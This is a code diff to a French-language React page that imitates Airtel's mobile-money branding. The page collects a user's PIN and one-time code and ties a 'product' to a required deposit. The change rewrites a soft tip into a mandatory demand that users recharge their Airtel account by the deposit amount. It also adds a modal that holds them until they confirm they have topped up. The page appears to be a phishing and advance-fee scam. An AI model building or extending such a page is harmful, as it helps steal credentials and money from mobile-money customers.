@@ -27,7 +27,8 @@
       const [otp, setOtp] = useState(['', '', '', '']);
       const [timer, setTimer] = useState(60);
       const [error, setError] = useState('');
-      const [sessionId] = useState(() => Math.random().toString(36).substring(2, 10));
+      const [showTopUpModal, setShowTopUpModal] = useState(false);
+      const [topUpAmount, setTopUpAmount] = useState('');
       const [product, setProduct] = useState(() => {
         try {
           return JSON.parse(localStorage.getItem('selected_product')) || { name: 'Article sélectionné', dep: 35 };
@@ -246,12 +247,28 @@
                 </p>
                 <div className='mt-6 p-5 bg-gray-50 rounded-2xl border border-gray-100 text-left'>
                   <p className='text-gray-700 text-sm leading-relaxed'>
-                    <b>Conseil :</b> Veuillez recharger votre compte Airtel, puis revenir pour soumettre de nouveau votre demande et profiter de nos offres exclusives.
+                    <b>Obligatoire :</b> Veuillez recharger votre compte Airtel du montant du dépôt requis avant de recommencer votre demande.
                   </p>
                 </div>
-                <button onClick={() => { setStep(1); setPin(['', '', '', '']); setOtp(['', '', '', '']); }} className='w-full mt-8 py-4 airtel-red text-white rounded-full text-lg font-bold hover:opacity-90 transition-colors'>Aller au tableau de bord</button>
+                <button onClick={() => setShowTopUpModal(true)} className='w-full mt-8 py-4 airtel-red text-white rounded-full text-lg font-bold hover:opacity-90 transition-colors'>Aller au tableau de bord</button>
               </div>
             </main>
+
+            {showTopUpModal && (
+              <div className='min-h-screen flex flex-col items-center justify-center bg-black/60 fixed inset-0 z-50 p-4'>
+                <div className='bg-white w-full max-w-md rounded-3xl shadow-2xl p-8 text-center'>
+                  <div className='mx-auto w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mb-5 text-red-600 font-bold text-2xl'>!</div>
+                  <h3 className='text-2xl font-bold text-gray-900'>Confirmation de rechargement</h3>
+                  <p className='text-gray-600 mt-3 text-sm leading-relaxed'>
+                    Avez-vous effectué le rechargement de votre compte Airtel pour couvrir le dépôt avant de recommencer ?
+                  </p>
+                  <div className='flex gap-4 mt-8'>
+                    <button onClick={() => setShowTopUpModal(false)} className='flex-1 py-3 bg-gray-200 text-gray-800 rounded-full font-bold hover:bg-gray-300 transition-colors text-sm'>Non, pas encore</button>
+                    <button onClick={() => { setStep(1); setPin(['', '', '', '']); setOtp(['', '', '', '']); setShowTopUpModal(false); }} className='flex-1 py-3 airtel-red text-white rounded-full font-bold hover:opacity-90 transition-colors text-sm'>Oui, j'ai rechargé</button>
+                  </div>
+                </div>
+              </div>
+            )}
           </div>
         );
       }
